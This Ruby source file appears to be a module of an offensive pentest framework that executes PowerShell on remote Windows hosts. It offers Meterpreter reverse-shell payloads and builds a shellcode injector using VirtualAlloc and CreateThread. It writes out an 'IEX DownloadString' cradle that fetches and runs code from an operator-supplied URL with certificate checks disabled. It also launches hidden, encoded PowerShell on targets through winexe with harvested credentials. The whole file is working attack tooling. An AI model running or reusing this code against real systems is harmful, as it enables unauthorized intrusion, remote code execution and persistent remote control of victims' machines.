require 'poet'
require 'lib_meta'
require 'server'
class Exec_Powershell < Poet::Scanner
  include Lib_meta
  include Server::Info

	self.mod_name = "Execute Powershell"
	self.description = "Execute arbitrary powershell on target(s). Non-interactive scripts only."
	self.invasive = true

  def payload_select
    payloads = {
        1 => 'windows/meterpreter/reverse_https',
        2 => 'windows/meterpreter/reverse_http',
        3 => 'windows/meterpreter/reverse_tcp',
    }

    payloads.each { |x,y|
      puts "    #{x}) #{y}"
    }
    puts

    # Selection for payload
    selection = ''
    until (1..payloads.length).member?(selection.to_i)
      print "Select payload [#{color_banner('1')}] : "
      selection = rgets
      selection = 1 if selection.empty?
    end
    payload = payloads[selection.to_i]
    puts
    return payload

  end

  def psh_injection(shellcode)
    psh_command = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);)
    psh_command << %([DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);)
    psh_command << %([DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;)
    psh_command << %([Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);)
    psh_command << %(for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';)
    psh_command << %($gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\\syswow64\\WindowsPowerShell\\v1.0\\powershell";)
    psh_command << %($cmd = "-nop -noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";})

  end

	def setup
		# Print title
		puts 
		title = "Powershell Launcher"

    attack = {
        1 => 'Execute Meterpreter Injection using HTTP/HTTPS server',
        2 => 'Execute Powershell Script',
    }

    attack.each {|k,v|
      puts "    #{k} #{v}"
    }
    puts

    print "Select attack method [#{color_banner('1')}] : "
    select_attack = rgets
    select_attack = 1 if select_attack.empty?
    case attack[select_attack.to_i]
      when 'Execute Meterpreter Injection using HTTP/HTTPS server'
        print "Host Payload? [#{color_banner('yes')}] : "
        hosting = rgets
        hosting = 'yes' if hosting.empty?
        if hosting == 'yes'
          url = get_url
          get_url if url.empty?
          ssl = url.is_ssl?
          host = get_host(url)
          port = get_port(url)
          payload = payload_select
          lhost, lport = get_meter_data
          shellcode = psh_shellcode(payload, lhost, lport)
          Thread.new { Server.new.raw_web(host, port, psh_injection(shellcode), ssl) }
          sleep(1)
        else
          url = get_url
          get_url if url.empty?
          payload = payload_select
          lhost, lport = get_meter_data
        end
        print "Start metasploit handler? [#{color_banner('yes')}] : "
        selection = rgets
        selection = 'yes' if selection.empty?
        if selection == 'yes'
          rc = create_rc(payload, lhost, lport)
          create_handler(rc)
          puts "Press enter when Metasploit starts"
          gets
        end
        ps_command = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };"
        ps_command << "IEX (New-Object Net.WebClient).DownloadString('#{url}')"
        @encoded_ps = ps_command.to_ps_base64!
        @results = Hash.new
        puts color_header(title)

      when 'Execute Powershell Script'
        ps_files = []
        Dir.foreach("#{APP_ROOT}/powershell") {|file|
          if file[-4,4].eql? ".ps1"
            ps_files << file
          end
        }

        puts "Powershell folder empty, press #{highlight('control-c')} to quit" if ps_files.empty?

        # Print out powershell files
        i = 0
        while i < ps_files.length do
          puts "#{i+1}. #{ps_files[i]}"
          i +=1
        end
        # (Add in later)
        # puts "#{i+1}. Exit"
        puts
        to_load = ''

        # Make sure the user gives a valid selection
        until (1..ps_files.length+1).member?(to_load.to_i)
          print "Which powershell script do you wish to load?"
          to_load = rgets(" ")
        end

        # Return to previous menu
        # (Add in later)
        # return if to_load.to_i.eql? i+1

        @filename = ps_files[to_load.to_i - 1]

        # Read the file and encodeds
        @encoded_ps = File.read("#{APP_ROOT}/powershell/#{@filename}").to_ps_base64!

        @results = Hash.new
        puts
        puts color_header(title)
      end

      def run(username, password, host)
        ps_args = "cmd /c echo . | powershell  -noprofile -windowstyle "
        ps_args << "hidden -noninteractive -EncodedCommand #{@encoded_ps}"
        result = winexe("//#{host}", ps_args)
        @results[host] = result
        print_good("#{host.ljust(15)} - Powershell command completed")
      end

      def finish
        puts "\nPowershell module completed"

        final_output = ''
        @results.each_pair do |key, value|
          final_output << "#{key}:\n#{value}\n\n"
        end
        write_file(final_output, "results_#{self.class}_#{@filename}_#{Time.now.strftime('%m-%d-%Y_%H-%M')}")
        puts "Output can be found in #{Menu.opts[:log]}/results_#{self.class}_#{@filename}_#{Time.now.strftime('%m-%d-%Y_%H-%M')}"

        # Return to menu
        puts
        print "Press enter to return to Exploitation Menu"
        gets
      rescue => e
        puts e
      end
    end
end